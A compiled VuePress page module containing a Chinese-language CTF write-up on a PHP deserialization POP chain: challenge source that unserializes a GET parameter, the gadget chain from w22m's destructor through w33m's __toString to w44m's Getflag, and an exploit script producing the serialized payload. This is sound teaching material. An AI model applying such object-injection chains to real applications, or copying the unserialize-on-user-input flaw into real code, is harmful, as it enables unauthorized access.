import{_ as n,o as s,c as a,e}from"./app-3b511de6.js";const p={},t=e(`<p>#PHP序列化</p><h1 id="_1-源码" tabindex="-1"><a class="header-anchor" href="#_1-源码" aria-hidden="true">#</a> 1.源码</h1><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;index.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">w44m</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;aaa&#39;</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;123456&#39;</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string single-quoted-string">&#39;w44m&#39;</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string single-quoted-string">&#39;08067&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;flag.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;nono&#39;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">w00m</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">w33m</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$w22m</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">w00m</span><span class="token operator">-&gt;</span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">w22m</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$w00m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;w00m&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$w00m</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="_2-查找入口" tabindex="-1"><a class="header-anchor" href="#_2-查找入口" aria-hidden="true">#</a> 2.查找入口</h1><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment"># 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，</span>
这里的w22m符合条件 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span><span class="token punctuation">{</span> 
	<span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span> 
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
		<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">w00m</span><span class="token punctuation">;</span> 
	<span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="_3-找链子" tabindex="-1"><a class="header-anchor" href="#_3-找链子" aria-hidden="true">#</a> 3.找链子</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下

w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="_4-写exp" tabindex="-1"><a class="header-anchor" href="#_4-写exp" aria-hidden="true">#</a> 4.写exp</h1><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">w44m</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;w44m&#39;</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;08067&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">w22m</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">w33m</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$w00m</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$w22m</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token comment"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w22m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w33m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">w44m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 入口</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">w00m</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token comment"># 链子</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">w00m</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">w22m</span><span class="token operator">=</span><span class="token string single-quoted-string">&#39;Getflag&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9),i=[t];function o(l,c){return s(),a("div",null,i)}const r=n(p,[["render",o],["__file","pop.html.vue"]]);export{r as default};
